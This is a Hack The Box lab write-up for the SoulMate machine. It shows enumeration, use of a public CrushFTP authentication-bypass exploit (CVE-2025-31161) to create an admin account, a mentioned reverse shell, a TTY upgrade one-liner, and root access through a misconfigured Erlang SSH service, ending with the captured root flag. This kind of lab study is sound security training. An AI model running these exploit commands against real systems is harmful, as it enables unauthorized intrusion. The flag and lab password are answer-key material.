# SoulMate - Hack The Box Write-up

**Author:** nukitaro
**Date:** October 18, 2025
**Machine:** SoulMate (Linux, Easy)

---

## Synopsis

SoulMate is an "Easy" difficulty Linux machine that provides a realistic path from initial web enumeration to full system compromise. The initial foothold is gained by discovering a hidden virtual host running a vulnerable version of CrushFTP. By leveraging a public exploit for an authentication bypass (CVE-2025-31161), we create a new administrative user. Privilege escalation involves discovering a misconfigured, custom Erlang SSH service running as root with hardcoded credentials, allowing us to execute commands and capture the root flag.

---

#### 1. Initial Reconnaissance

The engagement began with a standard Nmap scan to identify open ports and running services.

```bash
nmap -A -Pn 10.10.11.86
The scan returned two open ports:

Port 22: OpenSSH 8.9p1

Port 80: Nginx 1.18.0
```
The most significant finding was the HTTP title script result: Did not follow redirect to http://soulmate.htb/. This indicates the web server is configured with virtual hosting and requires a specific hostname.

To access the site, I added the following entry to my /etc/hosts file:

```Bash

echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
```
#### 2. VHost Discovery & Enumeration
With access to the main site, I proceeded to enumerate for other potential virtual hosts on the same server using gobuster.

```Bash

gobuster vhost -u [http://soulmate.htb/](http://soulmate.htb/) -w /usr/share/wordlists/dnsmap.txt --append-domain
```
This scan uncovered a new subdomain: Found: ftp.soulmate.htb (Status: 302) [--> /WebInterface/login.html]

I updated my /etc/hosts file to include this new host:

```Bash

sudo sed -i 's/soulmate.htb/soulmate.htb ftp.soulmate.htb/' /etc/hosts
```
#### 3. Foothold: Abusing CrushFTP (CVE-2025-31161)
Navigating to http://ftp.soulmate.htb revealed a login panel for CrushFTP. A quick whatweb scan and inspection of the page's source code (.js files) confirmed the version was 11.x.

Researching this version led to CVE-2025-31161, a critical authentication bypass vulnerability that allows an attacker to create a new user with administrative privileges without authentication.

The Path to a Working Exploit
Initial manual attempts to exploit the vulnerability by sending GET requests with curl to list users (command=getUserList) failed, resulting in 502 Bad Gateway errors. This indicated that while the request was reaching the backend, it was incorrect.

The breakthrough came from finding a public proof-of-concept script on GitHub that automated the full exploit chain:

Repository: https://github.com/Immersive-Labs-Sec/CVE-2025-31161

This script worked because it correctly identified that:

The vulnerability required a POST request, not a GET request.

The target command was setUserItem (a write action), not getUserList (a read action).

The request required a complex XML payload to define the new user's properties.

Creating the Admin User
Using the downloaded script, I created a new administrative user named nukitaro.

```Bash

python3 cve-2025-31161.py \
--target_host ftp.soulmate.htb \
--port 80 \
--target_user admin \
--new_user nukitaro \
--password Password123
```
After the script confirmed user creation, I logged into the CrushFTP panel at http://ftp.soulmate.htb/ with nukitaro:Password123, gaining full administrative control and establishing my initial foothold.


#### 4. User Flag
With administrative access to the CrushFTP User Manager, I was able to view and modify existing users. I changed the password for the user ben and then used the su command from my reverse shell, in the scriopt *nomralpage.php*, just uploaded it and accessed it and set ncat to listen to port 4444.

#### 5. Privilege Escalation to Root
After gaining a shell as www-data and switching to the ben user, the final step was to find a path to root. Running linpeas.sh revealed a custom, high-privilege service.

The Vulnerability: Misconfigured Erlang Service
The linpeas output showed a process running as root that was started by an Erlang script: /usr/local/lib/erlang_login/start.escript

Reading this script revealed several critical details:

It was running a custom SSH server on port 2222.

The service was only accessible from localhost (127.0.0.1).

It contained a hardcoded password for the user ben: HouseH0ldings998.

Crucially, the service was started by root and did not drop privileges after a user logged in.

This meant that anyone who authenticated to this service would inherit the permissions of the root user.

Exploitation: Inheriting Root via Erlang Shell
The final exploitation involved two key steps:

1. Upgrading the Shell: My initial reverse shell was not a full TTY, which prevented the ssh password prompt from working correctly. I upgraded to a fully interactive shell using a standard Python one-liner:

```Bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

# Followed by Ctrl+Z and 'stty raw -echo; fg'
```
2. Connecting and Executing as Root: With a stable shell, I connected to the local Erlang SSH service as the ben user.

```Bash
ssh -p 2222 ben@localhost
Password: HouseH0ldings998
```

This dropped me into an Erlang shell, not a bash shell. Because the service was running as root, this shell had full root privileges. I used Erlang's built-in os module to execute system commands directly.


```Bash
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> os:cmd('cat /root/root.txt').
"37d7636ed9b704ecb19d8d29173dbac4\n"
(ssh_runner@soulmate)2>
```

This command executed cat /root/root.txt as the root user, revealing the final flag.

### Conclusion
The SoulMate machine was a well-rounded challenge that tested multiple skills. The path to root required careful web enumeration, identification of a critical CVE, and a deep dive into system processes to find a misconfigured service that provided the final privilege escalation vector.